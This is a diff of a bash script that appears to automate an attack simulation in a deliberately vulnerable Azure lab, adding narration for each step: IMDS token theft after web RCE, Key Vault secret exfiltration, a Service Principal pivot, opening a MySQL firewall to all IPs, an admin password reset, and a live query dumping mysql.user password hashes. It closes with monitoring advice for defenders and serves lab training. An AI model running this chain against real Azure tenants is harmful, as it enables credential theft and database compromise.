@@ -43,7 +43,7 @@ spin_start() {
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
 banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 1              ===" "${RESET}"
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          CDRGoat Azure - Scenario 1              ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Exploitation of Web RCE, metadata stealing on VMa\n"
   printf "  • Step 2. Permission enumeration for stolen metadata\n"
@@ -202,6 +202,20 @@ if [ -z "$GraphToken" ] || [ "$GraphToken" = "null" ]; then
 fi
 
 ok "Graph Token extracted successfully"
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We exploited a Remote Code Execution (RCE) vulnerability in the web application\n"
+printf "to access the Azure Instance Metadata Service (IMDS) at 169.254.169.254.\n\n"
+printf "From IMDS, we obtained two OAuth access tokens:\n"
+printf "  • ${MAGENTA}Azure Management Token${RESET}: Grants access to Azure Resource Manager APIs\n"
+printf "  • ${MAGENTA}Microsoft Graph Token${RESET}: Grants access to Azure AD/Entra ID APIs\n\n"
+printf "These tokens inherit the permissions of the VM's Managed Identity.\n"
+printf "The Managed Identity is a first-class Azure AD principal, meaning it can\n"
+printf "have RBAC roles and Graph API permissions just like a user or service principal.\n\n"
+
 read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
@@ -345,8 +359,21 @@ echo "$ROLE_ASSIGNMENTS_JSON" | jq -c '.value[]' | while read -r entry; do
   printf "    Scope    : %s\n\n" "$scope"
 done
 
-printf "We see that we have Reader role for KeyVault service. On next step lets collect one more Token (VaultToken) and enumerate content of the vault.\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We enumerated the Azure RBAC permissions assigned to the stolen Managed Identity.\n"
+printf "The identity has ${YELLOW}Reader${RESET} role on Key Vault resources.\n\n"
+printf "Azure Key Vault supports two authorization models:\n"
+printf "  • ${MAGENTA}Vault Access Policy${RESET} (legacy): Explicit policies per principal\n"
+printf "  • ${MAGENTA}Azure RBAC${RESET} (modern): Standard role assignments\n\n"
+printf "With Reader access to the vault, we can list secrets metadata.\n"
+printf "If the vault uses RBAC and grants 'Key Vault Secrets User' to the MI,\n"
+printf "we can also read secret values directly.\n\n"
+printf "Next step: Obtain a vault-scoped token and enumerate vault contents.\n\n"
+
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 3. Accessing Azure Key Vault and exfiltrating secrets
@@ -462,7 +489,20 @@ for secret_uri in "${SECRET_URIS[@]}"; do
   fi
 done
 
-echo
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We successfully accessed Azure Key Vault and exfiltrated stored secrets.\n\n"
+printf "Key Vault is commonly used by organizations to store:\n"
+printf "  • Service Principal credentials (client ID + secret)\n"
+printf "  • API keys and connection strings\n"
+printf "  • Certificates and encryption keys\n"
+printf "  • Database passwords\n\n"
+printf "We discovered Service Principal credentials stored in the vault.\n"
+printf "These credentials allow us to ${MAGENTA}pivot${RESET} to a different identity\n"
+printf "with potentially broader permissions than the original Managed Identity.\n\n"
+
 read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
@@ -608,7 +648,23 @@ if [ -z "$MYSQL_SERVER_NAME" ] || [ "$MYSQL_SERVER_NAME" = "null" ]; then
   exit 1
 fi
 
-printf "We found an account with very interesting combination of permissions udner SQL server Azure object. With ${YELLOW}Reader${RESET} role we can identify FDQN of the database, DB administrator username and check current FireWall rules. But with ${YELLOW}Contributor${RESET} we can overwride all security restrictions such as user passwrod FireWall rule. And when it is done - connect and exfiltrate sensitive data.\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We pivoted to a Service Principal with an interesting permission combination\n"
+printf "on the Azure MySQL Flexible Server resource:\n\n"
+printf "  • ${YELLOW}Reader${RESET} role: Enumerate server configuration, FQDN, admin username,\n"
+printf "    and current firewall rules (reconnaissance)\n\n"
+printf "  • ${YELLOW}Contributor${RESET} role: Modify server configuration including:\n"
+printf "    - Reset administrator password\n"
+printf "    - Add/modify firewall rules\n"
+printf "    - Change network access settings\n\n"
+printf "This is a classic ${MAGENTA}control plane abuse${RESET} scenario:\n"
+printf "Azure RBAC permissions on a resource allow modifying security controls\n"
+printf "that protect the data plane (the database itself).\n\n"
+printf "Next: Use Contributor access to expose the database and reset credentials.\n\n"
+
 read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
@@ -651,8 +707,20 @@ ok "Found $RULE_COUNT firewall rules"
 echo "$MYSQL_FW_JSON" | jq -r \
   '.value[] | "  • \(.name): \(.properties.startIpAddress) - \(.properties.endIpAddress)"'
 
-echo
-read -r -p "We see there is no any permit FireWall rules, which means DB is private. Now we adding wide permit rule and changing admin user password. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "The MySQL Flexible Server currently has ${YELLOW}no firewall rules${RESET},\n"
+printf "meaning the database is effectively private (no external access).\n\n"
+printf "With Contributor permissions, we can:\n"
+printf "  1. Add a permissive firewall rule (0.0.0.0 - 255.255.255.255)\n"
+printf "     to allow connections from any IP address\n"
+printf "  2. Reset the administrator password to credentials we control\n\n"
+printf "This demonstrates how ${MAGENTA}Azure RBAC overpermissioning${RESET} can lead to\n"
+printf "complete database compromise without any data plane credentials.\n\n"
+
+read -r -p "Press Enter to proceed with database exposure (or Ctrl+C to abort)..." _ || true
 
 step "Adding permissive firewall rule (0.0.0.0 - 255.255.255.255)"
 spin_start "Creating AllowAll firewall rule"
@@ -691,15 +759,48 @@ spin_stop
 ok "Admin password reset completed"
 printf "  • New password: %s%s%s\n" "$MAGENTA" "$NEW_DB_PASSWORD" "$RESET"
 
-echo
-printf "Now everything is ready to let us in.\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We have successfully:\n"
+printf "  • Added a permissive firewall rule allowing any IP to connect\n"
+printf "  • Reset the administrator password to a value we control\n\n"
+printf "The database is now fully accessible from the internet.\n"
+printf "Next step: Connect directly and exfiltrate sensitive data.\n\n"
+
 read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
 # Step 6. MySQL data exfiltration
 ################################################################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. MySQL data exfiltration  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. MySQL data exfiltration  ===" "${RESET}"
 
 step "Leaking MySQL credentials from mysql.user"
 
 MYSQL_PWD=$NEW_DB_PASSWORD mysql -h "$MYSQL_FQDN" -u "$MYSQL_ADMIN" -D mysql -e "SELECT User, Host, plugin, authentication_string FROM user;"
+
+################################################################################
+# Final Summary
+################################################################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"
+
+printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
+printf "  1. Exploited RCE vulnerability on VMa web application\n"
+printf "  2. Harvested Azure tokens from Instance Metadata Service (IMDS)\n"
+printf "  3. Enumerated RBAC permissions for stolen Managed Identity\n"
+printf "  4. Accessed Azure Key Vault and exfiltrated Service Principal credentials\n"
+printf "  5. Pivoted to Service Principal with MySQL server permissions\n"
+printf "  6. Exposed MySQL server (firewall + password reset)\n"
+printf "  7. Connected to database and exfiltrated sensitive data\n\n"
+
+printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
+printf "  • Full compromise of Azure MySQL Flexible Server\n"
+printf "  • Credential theft from Azure Key Vault\n"
+printf "  • Lateral movement via Service Principal pivot\n\n"
+
+printf "%s\n" "Defenders should monitor for:"
+printf "  • Unusual IMDS access patterns from VMs\n"
+printf "  • Key Vault secret access from unexpected identities\n"
+printf "  • Azure Resource Manager control plane changes (firewall, password reset)\n"
+printf "  • Database connections from unusual source IPs\n"
